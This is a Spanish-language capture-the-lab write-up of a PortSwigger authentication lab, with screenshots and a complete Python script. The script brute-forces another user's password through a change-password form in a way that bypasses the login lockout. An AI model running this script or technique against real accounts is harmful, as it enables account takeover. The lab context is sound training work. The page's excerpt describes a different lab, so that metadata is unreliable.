---
title: "12 Password brute-force via password change"
collection: publications
category: portswigger
permalink: publications/Authentication/12_Password brute-force via password change
excerpt: 'Este laboratorio es vulnerable al envenenamiento por restablecimiento de contraseña. El usuario carlos hará clic por descuido en cualquier enlace de los correos electrónicos que reciba. Para resolver el laboratorio, iniciamos sesión en la cuenta de Carlos.'
date: 2024-12-06
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'Password brute-force via password change'
---

![logo]({{site.url}}/images/Authentication/authentication-lab-12/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/Authentication/authentication-lab-12/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, utilizamos la lista de contraseñas candidatas para realizar un ataque de fuerza bruta a la cuenta de Carlos y acceder a su página  `My account" page.`

## Analisis

Iniciaremos sesión con credenciales validas para ver el funcionamiento del login.

![login]({{site.url}}/images/Authentication/authentication-lab-12/login.png)

Como es muy comun en algunas paginas web, al iniciar sesión por primera vez, nos solicita que cambiemos el password.

![login2]({{site.url}}/images/Authentication/authentication-lab-12/login2.png)

Al hacer muchos intentos vemos que nos bloquea el usuario

![bloque]({{site.url}}/images/Authentication/authentication-lab-12/bloqueo.png)

Volvemos a ingresar con credenciales validas e intentamos esta vez, colocando el password correcto en `Current password` y en las otras casillas passwords, diferentes para que arroje este error. De esta forma no, nos bloquea el usuario y podemos intentar con diferentes passwords.

![Match]({{site.url}}/images/Authentication/authentication-lab-12/match.png)

## Ataque

Realizamos el ataque con el intruder.

![Intruder]({{site.url}}/images/Authentication/authentication-lab-12/intruder.png)

Filtramos por `Length` y vemos un valor diferente

![Respuesta]({{site.url}}/images/Authentication/authentication-lab-12/respuesta.png)

## Login

![Login 3]({{site.url}}/images/Authentication/authentication-lab-12/login3.png)

## Aprobado

![Aprobado]({{site.url}}/images/Authentication/authentication-lab-12/aprobado.png)

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    print("(+) Logging into Wiener's account...")
    login_url = url + "/login"
    login_data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    print("(+) Brute-forcing Carlos's password...")
    change_password_url = url + "/my-account/change-password"
    
    with open('passwords.txt', 'r') as f:
        lines = f.readlines()

    for pwd in lines:
        pwd = pwd.strip('\n')
        change_password_data = {"username":"carlos","current-password": pwd, "new-password-1": "password1", "new-password-2": "password2"}
        r = s.post(change_password_url, data=change_password_data, verify=False, proxies=proxies)
        if "New passwords do not match" in r.text:
            carlos_pwd = pwd
            print("(+) Found Carlos's password: " + carlos_pwd)
            break
    
    if carlos_pwd:
        # login
        login_data = {"username": "carlos", "password": carlos_pwd}
        r = requests.post(login_url, data=login_data, verify=False, proxies=proxies)
        if 'Log out' in r.text:
            print("(+) Successfully logged into Carlos's account.")
        else:
            print("(-) Could not log into Carlos's account.")
            sys.exit(-1)
    else:
        print("(-) Could not find Carlos's password.")
        sys.exit(-1)

def main():
    if len(sys.argv) !=2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()
```